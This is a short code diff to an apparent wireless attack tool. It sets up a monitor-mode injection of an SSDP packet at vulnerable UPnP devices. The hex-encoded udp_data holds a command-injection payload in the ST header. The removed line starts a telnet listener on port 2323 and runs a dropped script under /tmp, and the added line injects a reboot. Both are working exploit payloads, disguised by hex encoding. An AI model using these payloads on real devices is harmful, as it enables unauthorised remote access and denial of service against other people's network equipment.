@@ -21,9 +21,9 @@ def getArguments():
     udp_dest_ip = "239.255.255.250"
     udp_source_port = "12345"
     udp_dest_port = "1900"
-    udp_data = "4d2d534541524348202a20485454502f312e310d0a484f53543a3233392e3235352e3235352e3235303a313930300d0a53543a757569643a6074656c6e657464202d7020323332333b206563686f2022746f756368202f746d702f74657374223e2f746d702f6167656e743b2063686d6f64202b78202f746d702f6167656e743b202f746d702f6167656e74600d0a4d583a320d0a4d414e3a22737364703a646973636f766572220d0a0d0a"
+    udp_data = "4d2d534541524348202a20485454502f312e310d0a484f53543a3233392e3235352e3235352e3235303a313930300d0a53543a757569643a607265626f6f74600d0a4d583a320d0a4d414e3a22737364703a646973636f766572220d0a0d0a"
     run_with_sudo = "True"
-    notes = 'While in monitor mode, injects a command via SSDP to a vulnerable UPnP device. Same as "UDP to AP QoS" in Packet Crafter.'
+    notes = 'While in monitor mode, injects a reboot command via SSDP to a vulnerable UPnP device. Same as "UDP to AP QoS" in Packet Crafter.'
     
     arg_names = ['iface','interval','ap_mac','sta_source_mac','sta_dest_mac','type_subtype','flags','duration','fragment_sequence','qos_control','udp_source_ip','udp_dest_ip','udp_source_port','udp_dest_port','udp_data','run_with_sudo','notes']
     arg_values = [iface,interval,ap_mac,sta_source_mac,sta_dest_mac,type_subtype,flags,duration,fragment_sequence,qos_control,udp_source_ip,udp_dest_ip,udp_source_port,udp_dest_port,udp_data,run_with_sudo,notes]
